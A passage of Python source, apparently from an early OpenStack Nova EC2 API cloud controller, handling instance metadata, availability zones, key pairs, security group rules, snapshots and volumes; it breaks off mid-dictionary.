genrootca_sh_path = os.path.join(os.path.dirname(__file__),\n                                             os.path.pardir,\n                                             os.path.pardir,\n                                             'CA',\n                                             'genrootca.sh')\n\n            start = os.getcwd()\n            if not os.path.exists(FLAGS.ca_path):\n                os.makedirs(FLAGS.ca_path)\n            os.chdir(FLAGS.ca_path)\n            # TODO(vish): Do this with M2Crypto instead\n            utils.runthis(_(\"Generating root CA: %s\"), \"sh\", genrootca_sh_path)\n            os.chdir(start)\n\n    def _get_mpi_data(self, context, project_id):\n        result = {}\n        search_opts = {'project_id': project_id}\n        for instance in self.compute_api.get_all(context,\n                search_opts=search_opts):\n            if instance['fixed_ips']:\n                line = '%s slots=%d' % (instance['fixed_ips'][0]['address'],\n                                        instance['vcpus'])\n                key = str(instance['key_name'])\n                if key in result:\n                    result[key].append(line)\n                else:\n                    result[key] = [line]\n        return result\n\n    def _get_availability_zone_by_host(self, context, host):\n        services = db.service_get_all_by_host(context.elevated(), host)\n        if len(services) > 0:\n            return services[0]['availability_zone']\n        return 'unknown zone'\n\n    def _get_image_state(self, image):\n        # NOTE(vish): fallback status if image_state isn't set\n        state = image.get('status')\n        if state == 'active':\n            state = 'available'\n        return image['properties'].get('image_state', state)\n\n    def _format_instance_mapping(self, ctxt, instance_ref):\n        root_device_name = instance_ref['root_device_name']\n        if root_device_name is None:\n            return _DEFAULT_MAPPINGS\n\n        mappings = {}\n        mappings['ami'] = block_device.strip_dev(root_device_name)\n        mappings['root'] = root_device_name\n        default_local_device = instance_ref.get('default_local_device')\n        if default_local_device:\n            mappings['ephemeral0'] = default_local_device\n        default_swap_device = instance_ref.get('default_swap_device')\n        if default_swap_device:\n            mappings['swap'] = default_swap_device\n        ebs_devices = []\n\n        # 'ephemeralN', 'swap' and ebs\n        for bdm in db.block_device_mapping_get_all_by_instance(\n            ctxt, instance_ref['id']):\n            if bdm['no_device']:\n                continue\n\n            # ebs volume case\n            if (bdm['volume_id'] or bdm['snapshot_id']):\n                ebs_devices.append(bdm['device_name'])\n                continue\n\n            virtual_name = bdm['virtual_name']\n            if not virtual_name:\n                continue\n\n            if block_device.is_swap_or_ephemeral(virtual_name):\n                mappings[virtual_name] = bdm['device_name']\n\n        # NOTE(yamahata): I'm not sure how ebs device should be numbered.\n        #                 Right now sort by device name for deterministic\n        #                 result.\n        if ebs_devices:\n            nebs = 0\n            ebs_devices.sort()\n            for ebs in ebs_devices:\n                mappings['ebs%d' % nebs] = ebs\n                nebs += 1\n\n        return mappings\n\n    def get_metadata(self, address):\n        ctxt = context.get_admin_context()\n        search_opts = {'fixed_ip': address}\n        try:\n            instance_ref = self.compute_api.get_all(ctxt,\n                    search_opts=search_opts)\n        except exception.NotFound:\n            instance_ref = None\n        if not instance_ref:\n            return None\n\n        # This ensures that all attributes of the instance\n        # are populated.\n        instance_ref = db.instance_get(ctxt, instance_ref[0]['id'])\n\n        mpi = self._get_mpi_data(ctxt, instance_ref['project_id'])\n        hostname = \"%s.%s\" % (instance_ref['hostname'], FLAGS.dhcp_domain)\n        host = instance_ref['host']\n        availability_zone = self._get_availability_zone_by_host(ctxt, host)\n        floating_ip = db.instance_get_floating_address(ctxt,\n                                                       instance_ref['id'])\n        ec2_id = ec2utils.id_to_ec2_id(instance_ref['id'])\n        image_ec2_id = self.image_ec2_id(instance_ref['image_ref'])\n        security_groups = db.security_group_get_by_instance(ctxt,\n                                                            instance_ref['id'])\n        security_groups = [x['name'] for x in security_groups]\n        mappings = self._format_instance_mapping(ctxt, instance_ref)\n        data = {\n            'user-data': self._format_user_data(instance_ref),\n            'meta-data': {\n                'ami-id': image_ec2_id,\n                'ami-launch-index': instance_ref['launch_index'],\n                'ami-manifest-path': 'FIXME',\n                'block-device-mapping': mappings,\n                'hostname': hostname,\n                'instance-action': 'none',\n                'instance-id': ec2_id,\n                'instance-type': instance_ref['instance_type']['name'],\n                'local-hostname': hostname,\n                'local-ipv4': address,\n                'placement': {'availability-zone': availability_zone},\n                'public-hostname': hostname,\n                'public-ipv4': floating_ip or '',\n                'reservation-id': instance_ref['reservation_id'],\n                'security-groups': security_groups,\n                'mpi': mpi}}\n\n        # public-keys should be in meta-data only if user specified one\n        if instance_ref['key_name']:\n            data['meta-data']['public-keys'] = {\n                '0': {'_name': instance_ref['key_name'],\n                      'openssh-key': instance_ref['key_data']}}\n\n        for image_type in ['kernel', 'ramdisk']:\n            if instance_ref.get('%s_id' % image_type):\n                ec2_id = self.image_ec2_id(instance_ref['%s_id' % image_type],\n                                           self._image_type(image_type))\n                data['meta-data']['%s-id' % image_type] = ec2_id\n\n        if False:  # TODO(vish): store ancestor ids\n            data['ancestor-ami-ids'] = []\n        if False:  # TODO(vish): store product codes\n            data['product-codes'] = []\n        return data\n\n    def describe_availability_zones(self, context, **kwargs):\n        if ('zone_name' in kwargs and\n            'verbose' in kwargs['zone_name'] and\n            context.is_admin):\n            return self._describe_availability_zones_verbose(context,\n                                                             **kwargs)\n        else:\n            return self._describe_availability_zones(context, **kwargs)\n\n    def _describe_availability_zones(self, context, **kwargs):\n        ctxt = context.elevated()\n        enabled_services = db.service_get_all(ctxt, False)\n        disabled_services = db.service_get_all(ctxt, True)\n        available_zones = []\n        for zone in [service.availability_zone for service\n                     in enabled_services]:\n            if not zone in available_zones:\n                available_zones.append(zone)\n        not_available_zones = []\n        for zone in [service.availability_zone for service in disabled_services\n                     if not service['availability_zone'] in available_zones]:\n            if not zone in not_available_zones:\n                not_available_zones.append(zone)\n        result = []\n        for zone in available_zones:\n            result.append({'zoneName': zone,\n                           'zoneState': \"available\"})\n        for zone in not_available_zones:\n            result.append({'zoneName': zone,\n                           'zoneState': \"not available\"})\n        return {'availabilityZoneInfo': result}\n\n    def _describe_availability_zones_verbose(self, context, **kwargs):\n        rv = {'availabilityZoneInfo': [{'zoneName': 'nova',\n                                        'zoneState': 'available'}]}\n\n        services = db.service_get_all(context, False)\n        now = utils.utcnow()\n        hosts = []\n        for host in [service['host'] for service in services]:\n            if not host in hosts:\n                hosts.append(host)\n        for host in hosts:\n            rv['availabilityZoneInfo'].append({'zoneName': '|- %s' % host,\n                                               'zoneState': ''})\n            hsvcs = [service for service in services \\\n                     if service['host'] == host]\n            for svc in hsvcs:\n                delta = now - (svc['updated_at'] or svc['created_at'])\n                alive = (delta.seconds <= FLAGS.service_down_time)\n                art = (alive and \":-)\") or \"XXX\"\n                active = 'enabled'\n                if svc['disabled']:\n                    active = 'disabled'\n                rv['availabilityZoneInfo'].append({\n                        'zoneName': '| |- %s' % svc['binary'],\n                        'zoneState': '%s %s %s' % (active, art,\n                                                   svc['updated_at'])})\n        return rv\n\n    def describe_regions(self, context, region_name=None, **kwargs):\n        if FLAGS.region_list:\n            regions = []\n            for region in FLAGS.region_list:\n                name, _sep, host = region.partition('=')\n                endpoint = '%s://%s:%s%s' % (FLAGS.ec2_scheme,\n                                             host,\n                                             FLAGS.ec2_port,\n                                             FLAGS.ec2_path)\n                regions.append({'regionName': name,\n                                'regionEndpoint': endpoint})\n        else:\n            regions = [{'regionName': 'nova',\n                        'regionEndpoint': '%s://%s:%s%s' % (FLAGS.ec2_scheme,\n                                                            FLAGS.ec2_host,\n                                                            FLAGS.ec2_port,\n                                                            FLAGS.ec2_path)}]\n        return {'regionInfo': regions}\n\n    def describe_snapshots(self,\n                           context,\n                           snapshot_id=None,\n                           owner=None,\n                           restorable_by=None,\n                           **kwargs):\n        if snapshot_id:\n            snapshots = []\n            for ec2_id in snapshot_id:\n                internal_id = ec2utils.ec2_id_to_id(ec2_id)\n                snapshot = self.volume_api.get_snapshot(\n                    context,\n                    snapshot_id=internal_id)\n                snapshots.append(snapshot)\n        else:\n            snapshots = self.volume_api.get_all_snapshots(context)\n        snapshots = [self._format_snapshot(context, s) for s in snapshots]\n        return {'snapshotSet': snapshots}\n\n    def _format_snapshot(self, context, snapshot):\n        s = {}\n        s['snapshotId'] = ec2utils.id_to_ec2_snap_id(snapshot['id'])\n        s['volumeId'] = ec2utils.id_to_ec2_vol_id(snapshot['volume_id'])\n        s['status'] = snapshot['status']\n        s['startTime'] = snapshot['created_at']\n        s['progress'] = snapshot['progress']\n        s['ownerId'] = snapshot['project_id']\n        s['volumeSize'] = snapshot['volume_size']\n        s['description'] = snapshot['display_description']\n\n        s['display_name'] = snapshot['display_name']\n        s['display_description'] = snapshot['display_description']\n        return s\n\n    def create_snapshot(self, context, volume_id, **kwargs):\n        LOG.audit(_(\"Create snapshot of volume %s\"), volume_id,\n                  context=context)\n        volume_id = ec2utils.ec2_id_to_id(volume_id)\n        snapshot = self.volume_api.create_snapshot(\n                context,\n                volume_id=volume_id,\n                name=kwargs.get('display_name'),\n                description=kwargs.get('display_description'))\n        return self._format_snapshot(context, snapshot)\n\n    def delete_snapshot(self, context, snapshot_id, **kwargs):\n        snapshot_id = ec2utils.ec2_id_to_id(snapshot_id)\n        self.volume_api.delete_snapshot(context, snapshot_id=snapshot_id)\n        return True\n\n    def describe_key_pairs(self, context, key_name=None, **kwargs):\n        key_pairs = db.key_pair_get_all_by_user(context, context.user_id)\n        if not key_name is None:\n            key_pairs = [x for x in key_pairs if x['name'] in key_name]\n\n        result = []\n        for key_pair in key_pairs:\n            # filter out the vpn keys\n            suffix = FLAGS.vpn_key_suffix\n            if context.is_admin or \\\n               not key_pair['name'].endswith(suffix):\n                result.append({\n                    'keyName': key_pair['name'],\n                    'keyFingerprint': key_pair['fingerprint'],\n                })\n\n        return {'keySet': result}\n\n    def create_key_pair(self, context, key_name, **kwargs):\n        LOG.audit(_(\"Create key pair %s\"), key_name, context=context)\n        data = _gen_key(context, context.user_id, key_name)\n        return {'keyName': key_name,\n                'keyFingerprint': data['fingerprint'],\n                'keyMaterial': data['private_key']}\n        # TODO(vish): when context is no longer an object, pass it here\n\n    def import_public_key(self, context, key_name, public_key,\n                         fingerprint=None):\n        LOG.audit(_(\"Import key %s\"), key_name, context=context)\n        key = {}\n        key['user_id'] = context.user_id\n        key['name'] = key_name\n        key['public_key'] = public_key\n        if fingerprint is None:\n            tmpdir = tempfile.mkdtemp()\n            pubfile = os.path.join(tmpdir, 'temp.pub')\n            fh = open(pubfile, 'w')\n            fh.write(public_key)\n            fh.close()\n            (out, err) = utils.execute('ssh-keygen', '-q', '-l', '-f',\n                                       '%s' % (pubfile))\n            fingerprint = out.split(' ')[1]\n            shutil.rmtree(tmpdir)\n        key['fingerprint'] = fingerprint\n        db.key_pair_create(context, key)\n        return True\n\n    def delete_key_pair(self, context, key_name, **kwargs):\n        LOG.audit(_(\"Delete key pair %s\"), key_name, context=context)\n        try:\n            db.key_pair_destroy(context, context.user_id, key_name)\n        except exception.NotFound:\n            # aws returns true even if the key doesn't exist\n            pass\n        return True\n\n    def describe_security_groups(self, context, group_name=None, group_id=None,\n                                 **kwargs):\n        self.compute_api.ensure_default_security_group(context)\n        if group_name or group_id:\n            groups = []\n            if group_name:\n                for name in group_name:\n                    group = db.security_group_get_by_name(context,\n                                                          context.project_id,\n                                                          name)\n                    groups.append(group)\n            if group_id:\n                for gid in group_id:\n                    group = db.security_group_get(context, gid)\n                    groups.append(group)\n        elif context.is_admin:\n            groups = db.security_group_get_all(context)\n        else:\n            groups = db.security_group_get_by_project(context,\n                                                      context.project_id)\n        groups = [self._format_security_group(context, g) for g in groups]\n\n        return {'securityGroupInfo':\n                list(sorted(groups,\n                            key=lambda k: (k['ownerId'], k['groupName'])))}\n\n    def _format_security_group(self, context, group):\n        g = {}\n        g['groupDescription'] = group.description\n        g['groupName'] = group.name\n        g['ownerId'] = group.project_id\n        g['ipPermissions'] = []\n        for rule in group.rules:\n            r = {}\n            r['groups'] = []\n            r['ipRanges'] = []\n            if rule.group_id:\n                source_group = db.security_group_get(context, rule.group_id)\n                r['groups'] += [{'groupName': source_group.name,\n                                 'userId': source_group.project_id}]\n                if rule.protocol:\n                    r['ipProtocol'] = rule.protocol\n                    r['fromPort'] = rule.from_port\n                    r['toPort'] = rule.to_port\n                    g['ipPermissions'] += [dict(r)]\n                else:\n                    for protocol, min_port, max_port in (('icmp', -1, -1),\n                                                         ('tcp', 1, 65535),\n                                                         ('udp', 1, 65536)):\n                        r['ipProtocol'] = protocol\n                        r['fromPort'] = min_port\n                        r['toPort'] = max_port\n                        g['ipPermissions'] += [dict(r)]\n            else:\n                r['ipProtocol'] = rule.protocol\n                r['fromPort'] = rule.from_port\n                r['toPort'] = rule.to_port\n                r['ipRanges'] += [{'cidrIp': rule.cidr}]\n                g['ipPermissions'] += [r]\n        return g\n\n    def _rule_args_to_dict(self, context, kwargs):\n        rules = []\n        if not 'groups' in kwargs and not 'ip_ranges' in kwargs:\n            rule = self._rule_dict_last_step(context, **kwargs)\n            if rule:\n                rules.append(rule)\n            return rules\n        if 'ip_ranges' in kwargs:\n            rules = self._cidr_args_split(kwargs)\n        else:\n            rules = [kwargs]\n        finalset = []\n        for rule in rules:\n            if 'groups' in rule:\n                groups_values = self._groups_args_split(rule)\n                for groups_value in groups_values:\n                    final = self._rule_dict_last_step(context, **groups_value)\n                    finalset.append(final)\n            else:\n                final = self._rule_dict_last_step(context, **rule)\n                finalset.append(final)\n        return finalset\n\n    def _cidr_args_split(self, kwargs):\n        cidr_args_split = []\n        cidrs = kwargs['ip_ranges']\n        for key, cidr in cidrs.iteritems():\n            mykwargs = kwargs.copy()\n            del mykwargs['ip_ranges']\n            mykwargs['cidr_ip'] = cidr['cidr_ip']\n            cidr_args_split.append(mykwargs)\n        return cidr_args_split\n\n    def _groups_args_split(self, kwargs):\n        groups_args_split = []\n        groups = kwargs['groups']\n        for key, group in groups.iteritems():\n            mykwargs = kwargs.copy()\n            del mykwargs['groups']\n            if 'group_name' in group:\n                mykwargs['source_security_group_name'] = group['group_name']\n            if 'user_id' in group:\n                mykwargs['source_security_group_owner_id'] = group['user_id']\n            if 'group_id' in group:\n                mykwargs['source_security_group_id'] = group['group_id']\n            groups_args_split.append(mykwargs)\n        return groups_args_split\n\n    def _rule_dict_last_step(self, context, to_port=None, from_port=None,\n                                  ip_protocol=None, cidr_ip=None, user_id=None,\n                                  source_security_group_name=None,\n                                  source_security_group_owner_id=None):\n\n        values = {}\n\n        if source_security_group_name:\n            source_project_id = self._get_source_project_id(context,\n                source_security_group_owner_id)\n\n            source_security_group = \\\n                    db.security_group_get_by_name(context.elevated(),\n                                                  source_project_id,\n                                                  source_security_group_name)\n            notfound = exception.SecurityGroupNotFound\n            if not source_security_group:\n                raise notfound(security_group_id=source_security_group_name)\n            values['group_id'] = source_security_group['id']\n        elif cidr_ip:\n            # If this fails, it throws an exception. This is what we want.\n            cidr_ip = urllib.unquote(cidr_ip).decode()\n\n            if not utils.is_valid_cidr(cidr_ip):\n                # Raise exception for non-valid address\n                raise exception.InvalidCidr(cidr=cidr_ip)\n\n            values['cidr'] = cidr_ip\n        else:\n            values['cidr'] = '0.0.0.0/0'\n\n        if ip_protocol and from_port and to_port:\n\n            ip_protocol = str(ip_protocol)\n            try:\n                # Verify integer conversions\n                from_port = int(from_port)\n                to_port = int(to_port)\n            except ValueError:\n                if ip_protocol.upper() == 'ICMP':\n                    raise exception.InvalidInput(reason=\"Type and\"\n                         \" Code must be integers for ICMP protocol type\")\n                else:\n                    raise exception.InvalidInput(reason=\"To and From ports \"\n                          \"must be integers\")\n\n            if ip_protocol.upper() not in ['TCP', 'UDP', 'ICMP']:\n                raise exception.InvalidIpProtocol(protocol=ip_protocol)\n\n            # Verify that from_port must always be less than\n            # or equal to to_port\n            if from_port > to_port:\n                raise exception.InvalidPortRange(from_port=from_port,\n                      to_port=to_port, msg=\"Former value cannot\"\n                                            \" be greater than the later\")\n\n            # Verify valid TCP, UDP port ranges\n            if (ip_protocol.upper() in ['TCP', 'UDP'] and\n                (from_port < 1 or to_port > 65535)):\n                raise exception.InvalidPortRange(from_port=from_port,\n                      to_port=to_port, msg=\"Valid TCP ports should\"\n                                           \" be between 1-65535\")\n\n            # Verify ICMP type and code\n            if (ip_protocol.upper() == \"ICMP\" and\n                (from_port < -1 or to_port > 255)):\n                raise exception.InvalidPortRange(from_port=from_port,\n                      to_port=to_port, msg=\"For ICMP, the\"\n                                           \" type:code must be valid\")\n\n            values['protocol'] = ip_protocol\n            values['from_port'] = from_port\n            values['to_port'] = to_port\n        else:\n            # If cidr based filtering, protocol and ports are mandatory\n            if 'cidr' in values:\n                return None\n\n        return values\n\n    def _security_group_rule_exists(self, security_group, values):\n        \"\"\"Indicates whether the specified rule values are already\n           defined in the given security group.\n        \"\"\"\n        for rule in security_group.rules:\n            if 'group_id' in values:\n                if rule['group_id'] == values['group_id']:\n                    return rule['id']\n            else:\n                is_duplicate = True\n                for key in ('cidr', 'from_port', 'to_port', 'protocol'):\n                    if rule[key] != values[key]:\n                        is_duplicate = False\n                        break\n                if is_duplicate:\n                    return rule['id']\n        return False\n\n    def revoke_security_group_ingress(self, context, group_name=None,\n                                      group_id=None, **kwargs):\n        if not group_name and not group_id:\n            err = \"Not enough parameters, need group_name or group_id\"\n            raise exception.ApiError(_(err))\n        self.compute_api.ensure_default_security_group(context)\n        notfound = exception.SecurityGroupNotFound\n        if group_name:\n            security_group = db.security_group_get_by_name(context,\n                                                           context.project_id,\n                                                           group_name)\n            if not security_group:\n                raise notfound(security_group_id=group_name)\n        if group_id:\n            security_group = db.security_group_get(context, group_id)\n            if not security_group:\n                raise notfound(security_group_id=group_id)\n\n        msg = \"Revoke security group ingress %s\"\n        LOG.audit(_(msg), security_group['name'], context=context)\n        prevalues = []\n        try:\n            prevalues = kwargs['ip_permissions']\n        except KeyError:\n            prevalues.append(kwargs)\n        rule_id = None\n        for values in prevalues:\n            rulesvalues = self._rule_args_to_dict(context, values)\n            if not rulesvalues:\n                err = \"%s Not enough parameters to build a valid rule\"\n                raise exception.ApiError(_(err % rulesvalues))\n\n            for values_for_rule in rulesvalues:\n                values_for_rule['parent_group_id'] = security_group.id\n                rule_id = self._security_group_rule_exists(security_group,\n                                                           values_for_rule)\n                if rule_id:\n                    db.security_group_rule_destroy(context, rule_id)\n        if rule_id:\n            # NOTE(vish): we removed a rule, so refresh\n            self.compute_api.trigger_security_group_rules_refresh(\n                    context,\n                    security_group_id=security_group['id'])\n            return True\n        raise exception.ApiError(_(\"No rule for the specified parameters.\"))\n\n    # TODO(soren): This has only been tested with Boto as the client.\n    #              Unfortunately, it seems Boto is using an old API\n    #              for these operations, so support for newer API versions\n    #              is sketchy.\n    def authorize_security_group_ingress(self, context, group_name=None,\n                                         group_id=None, **kwargs):\n        if not group_name and not group_id:\n            err = \"Not enough parameters, need group_name or group_id\"\n            raise exception.ApiError(_(err))\n        self.compute_api.ensure_default_security_group(context)\n        notfound = exception.SecurityGroupNotFound\n        if group_name:\n            security_group = db.security_group_get_by_name(context,\n                                                           context.project_id,\n                                                           group_name)\n            if not security_group:\n                raise notfound(security_group_id=group_name)\n        if group_id:\n            security_group = db.security_group_get(context, group_id)\n            if not security_group:\n                raise notfound(security_group_id=group_id)\n\n        msg = \"Authorize security group ingress %s\"\n        LOG.audit(_(msg), security_group['name'], context=context)\n        prevalues = []\n        try:\n            prevalues = kwargs['ip_permissions']\n        except KeyError:\n            prevalues.append(kwargs)\n        postvalues = []\n        for values in prevalues:\n            rulesvalues = self._rule_args_to_dict(context, values)\n            if not rulesvalues:\n                err = \"%s Not enough parameters to build a valid rule\"\n                raise exception.ApiError(_(err % rulesvalues))\n            for values_for_rule in rulesvalues:\n                values_for_rule['parent_group_id'] = security_group.id\n                if self._security_group_rule_exists(security_group,\n                                                    values_for_rule):\n                    err = '%s - This rule already exists in group'\n                    raise exception.ApiError(_(err) % values_for_rule)\n                postvalues.append(values_for_rule)\n\n        for values_for_rule in postvalues:\n            security_group_rule = db.security_group_rule_create(\n                    context,\n                    values_for_rule)\n\n        if postvalues:\n            self.compute_api.trigger_security_group_rules_refresh(\n                    context,\n                    security_group_id=security_group['id'])\n            return True\n\n        raise exception.ApiError(_(\"No rule for the specified parameters.\"))\n\n    def _get_source_project_id(self, context, source_security_group_owner_id):\n        if source_security_group_owner_id:\n        # Parse user:project for source group.\n            source_parts = source_security_group_owner_id.split(':')\n\n            # If no project name specified, assume it's same as user name.\n            # Since we're looking up by project name, the user name is not\n            # used here.  It's only read for EC2 API compatibility.\n            if len(source_parts) == 2:\n                source_project_id = source_parts[1]\n            else:\n                source_project_id = source_parts[0]\n        else:\n            source_project_id = context.project_id\n\n        return source_project_id\n\n    def create_security_group(self, context, group_name, group_description):\n        if not re.match('^[a-zA-Z0-9_\\- ]+$', str(group_name)):\n            # Some validation to ensure that values match API spec.\n            # - Alphanumeric characters, spaces, dashes, and underscores.\n            # TODO(Daviey): LP: #813685 extend beyond group_name checking, and\n            #  probably create a param validator that can be used elsewhere.\n            err = _(\"Value (%s) for parameter GroupName is invalid.\"\n                    \" Content limited to Alphanumeric characters, \"\n                    \"spaces, dashes, and underscores.\") % group_name\n            # err not that of master ec2 implementation, as they fail to raise.\n            raise exception.InvalidParameterValue(err=err)\n\n        if len(str(group_name)) > 255:\n            err = _(\"Value (%s) for parameter GroupName is invalid.\"\n                    \" Length exceeds maximum of 255.\") % group_name\n            raise exception.InvalidParameterValue(err=err)\n\n        LOG.audit(_(\"Create Security Group %s\"), group_name, context=context)\n        self.compute_api.ensure_default_security_group(context)\n        if db.security_group_exists(context, context.project_id, group_name):\n            raise exception.ApiError(_('group %s already exists') % group_name)\n\n        group = {'user_id': context.user_id,\n                 'project_id': context.project_id,\n                 'name': group_name,\n                 'description': group_description}\n        group_ref = db.security_group_create(context, group)\n\n        return {'securityGroupSet': [self._format_security_group(context,\n                                                                 group_ref)]}\n\n    def delete_security_group(self, context, group_name=None, group_id=None,\n                              **kwargs):\n        if not group_name and not group_id:\n            err = \"Not enough parameters, need group_name or group_id\"\n            raise exception.ApiError(_(err))\n        notfound = exception.SecurityGroupNotFound\n        if group_name:\n            security_group = db.security_group_get_by_name(context,\n                                                           context.project_id,\n                                                           group_name)\n            if not security_group:\n                raise notfound(security_group_id=group_name)\n        elif group_id:\n            security_group = db.security_group_get(context, group_id)\n            if not security_group:\n                raise notfound(security_group_id=group_id)\n        LOG.audit(_(\"Delete security group %s\"), group_name, context=context)\n        db.security_group_destroy(context, security_group.id)\n        return True\n\n    def get_console_output(self, context, instance_id, **kwargs):\n        LOG.audit(_(\"Get console output for instance %s\"), instance_id,\n                  context=context)\n        # instance_id may be passed in as a list of instances\n        if type(instance_id) == list:\n            ec2_id = instance_id[0]\n        else:\n            ec2_id = instance_id\n        instance_id = ec2utils.ec2_id_to_id(ec2_id)\n        output = self.compute_api.get_console_output(\n                context, instance_id=instance_id)\n        now = utils.utcnow()\n        return {\"InstanceId\": ec2_id,\n                \"Timestamp\": now,\n                \"output\": base64.b64encode(output)}\n\n    def get_ajax_console(self, context, instance_id, **kwargs):\n        ec2_id = instance_id[0]\n        instance_id = ec2utils.ec2_id_to_id(ec2_id)\n        return self.compute_api.get_ajax_console(context,\n                                                 instance_id=instance_id)\n\n    def get_vnc_console(self, context, instance_id, **kwargs):\n        \"\"\"Returns vnc browser url.  Used by OS dashboard.\"\"\"\n        ec2_id = instance_id\n        instance_id = ec2utils.ec2_id_to_id(ec2_id)\n        return self.compute_api.get_vnc_console(context,\n                                                instance_id=instance_id)\n\n    def describe_volumes(self, context, volume_id=None, **kwargs):\n        if volume_id:\n            volumes = []\n            for ec2_id in volume_id:\n                internal_id = ec2utils.ec2_id_to_id(ec2_id)\n                volume = self.volume_api.get(context, volume_id=internal_id)\n                volumes.append(volume)\n        else:\n            volumes = self.volume_api.get_all(context)\n        volumes = [self._format_volume(context, v) for v in volumes]\n        return {'volumeSet': volumes}\n\n    def _format_volume(self, context, volume):\n        instance_ec2_id = None\n        instance_data = None\n        if volume.get('instance', None):\n            instance_id = volume['instance']['id']\n            instance_ec2_id = ec2utils.id_to_ec2_id(instance_id)\n            instance_data = '%s[%s]' % (instance_ec2_id,\n                                        volume['instance']['host'])\n        v = {}\n        v['volumeId'] = ec2utils.id_to_ec2_vol_id(volume['id'])\n        v['status'] = volume['status']\n        v['size'] = volume['size']\n        v['availabilityZone'] = volume['availability_zone']\n        v['createTime'] = volume['created_at']\n        if context.is_admin:\n            v['status'] = '%s (%s, %s, %s, %s)' % (\n                volume['status'],\n                volume['project_id'],\n                volume['host'],\n                instance_data,\n                volume['mountpoint'])\n        if volume['attach_status'] == 'attached':\n            v['attachmentSet'] = [{'attachTime': volume['attach_time'],\n                                   'deleteOnTermination': False,\n                                   'device': volume['mountpoint'],\n                                   'instanceId': instance_ec2_id,\n                                   'status': 'attached',\n                                   'volumeId': v['volumeId']}]\n        else:\n            v['attachmentSet'] = [{}]\n        if volume.get('snapshot_id') != None:\n            v['snapshotId'] = ec2utils.id_to_ec2_snap_id(volume['snapshot_id'])\n        else:\n            v['snapshotId'] = None\n\n        v['display_name'] = volume['display_name']\n        v['display_description'] = volume['display_description']\n        return v\n\n    def create_volume(self, context, **kwargs):\n        size = kwargs.get('size')\n        if kwargs.get('snapshot_id') != None:\n            snapshot_id = ec2utils.ec2_id_to_id(kwargs['snapshot_id'])\n            LOG.audit(_(\"Create volume from snapshot %s\"), snapshot_id,\n                      context=context)\n        else:\n            snapshot_id = None\n            LOG.audit(_(\"Create volume of %s GB\"), size, context=context)\n\n        volume = self.volume_api.create(\n                context,\n                size=size,\n                snapshot_id=snapshot_id,\n                name=kwargs.get('display_name'),\n                description=kwargs.get('display_description'))\n        # TODO(vish): Instance should be None at db layer instead of\n        #             trying to lazy load, but for now we turn it into\n        #             a dict to avoid an error.\n        return self._format_volume(context, dict(volume))\n\n    def delete_volume(self, context, volume_id, **kwargs):\n        volume_id = ec2utils.ec2_id_to_id(volume_id)\n        self.volume_api.delete(context, volume_id=volume_id)\n        return True\n\n    def update_volume(self, context, volume_id, **kwargs):\n        volume_id = ec2utils.ec2_id_to_id(volume_id)\n        updatable_fields = ['display_name', 'display_description']\n        changes = {}\n        for field in updatable_fields:\n            if field in kwargs:\n                changes[field] = kwargs[field]\n        if changes:\n            self.volume_api.update(context,\n                                   volume_id=volume_id,\n                                   fields=changes)\n        return True\n\n    def attach_volume(self, context, volume_id, instance_id, device, **kwargs):\n        volume_id = ec2utils.ec2_id_to_id(volume_id)\n        instance_id = ec2utils.ec2_id_to_id(instance_id)\n        msg = _(\"Attach volume %(volume_id)s to instance %(instance_id)s\"\n                \" at %(device)s\") % locals()\n        LOG.audit(msg, context=context)\n        self.compute_api.attach_volume(context,\n                                       instance_id=instance_id,\n                                       volume_id=volume_id,\n                                       device=device)\n        volume = self.volume_api.get(context, volume_id=volume_id)\n        return {'attachTime': volume['attach_time'],\n                'device': volume['mountpoint'],\n                'instanceId': ec2utils.id_to_ec2_id(instance_id),\n                'requestId': context.request_id,\n                'status': volume['attach_status'],\n                'volumeId': ec2utils.id_to_ec2_vol_id(volume_id)}\n\n    def detach_volume(self, context, volume_id, **kwargs):\n        volume_id = ec2utils.ec2_id_to_id(volume_id)\n        LOG.audit(_(\"Detach volume %s\"), volume_id, context=context)\n        volume = self.volume_api.get(context, volume_id=volume_id)\n        instance = self.compute_api.detach_volume(context, volume_id=volume_id)\n        return {'attachTime': volume['attach_time'],\n                'device': volume['mountpoint'],\n                'instanceId': ec2utils.id_to_ec2_id(instance['id']),\n                'requestId': context.request_id,\n                'status': volume['attach_status'],\n                'volumeId': ec2utils.id_to_ec2_vol_id(volume_id)}\n\n    def _format_kernel_id(self, instance_ref, result, key):\n        kernel_id = instance_ref['kernel_id']\n        if kernel_id is None:\n            return\n        result[key] = self.image_ec2_id(instance_ref['kernel_id'], 'aki')\n\n    def _format_ramdisk_id(self, instance_ref, result, key):\n        ramdisk_id = instance_ref['ramdisk_id']\n        if ramdisk_id is None:\n            return\n        result[key] = self.image_ec2_id(instance_ref['ramdisk_id'], 'ari')\n\n    @staticmethod\n    def _format_user_data(instance_ref):\n        return base64.b64decode(instance_ref['user_data'])\n\n    def describe_instance_attribute(self, context, instance_id, attribute,\n                                    **kwargs):\n        def _unsupported_attribute(instance, result):\n            raise exception.ApiError(_('attribute not supported: %s') %\n                                     attribute)\n\n        def _format_attr_block_device_mapping(instance, result):\n            tmp = {}\n            self._format_instance_root_device_name(instance, tmp)\n            self._format_instance_bdm(context, instance_id,\n                                      tmp['rootDeviceName'], result)\n\n        def _format_attr_disable_api_termination(instance, result):\n            _unsupported_attribute(instance, result)\n\n        def _format_attr_group_set(instance, result):\n            CloudController._format_group_set(instance, result)\n\n        def _format_attr_instance_initiated_shutdown_behavior(instance,\n                                                               result):\n            vm_state = instance['vm_state']\n            state_to_value = {\n                vm_states.STOPPED: 'stopped',\n                vm_states.DELETED: 'terminated',\n            }\n            value = state_to_value.get(vm_state)\n            if value:\n                result['instanceInitiatedShutdownBehavior'] = value\n\n        def _format_attr_instance_type(instance, result):\n            self._format_instance_type(instance, result)\n\n        def _format_attr_kernel(instance, result):\n            self._format_kernel_id(instance, result, 'kernel')\n\n        def _format_attr_ramdisk(instance, result):\n            self._format_ramdisk_id(instance, result, 'ramdisk')\n\n        def _format_attr_root_device_name(instance, result):\n            self._format_instance_root_device_name(instance, result)\n\n        def _format_attr_source_dest_check(instance, result):\n            _unsupported_attribute(instance, result)\n\n        def _format_attr_user_data(instance, result):\n            result['userData'] = self._format_user_data(instance)\n\n        attribute_formatter = {\n            'blockDeviceMapping': _format_attr_block_device_mapping,\n            'disableApiTermination': _format_attr_disable_api_termination,\n            'groupSet': _format_attr_group_set,\n            'instanceInitiatedShutdownBehavior':\n            _format_attr_instance_initiated_shutdown_behavior,\n            'instanceType': _format_attr_instance_type,\n            'kernel': _format_attr_kernel,\n            'ramdisk': _format_attr_ramdisk,\n            'rootDeviceName': _format_attr_root_device_name,\n      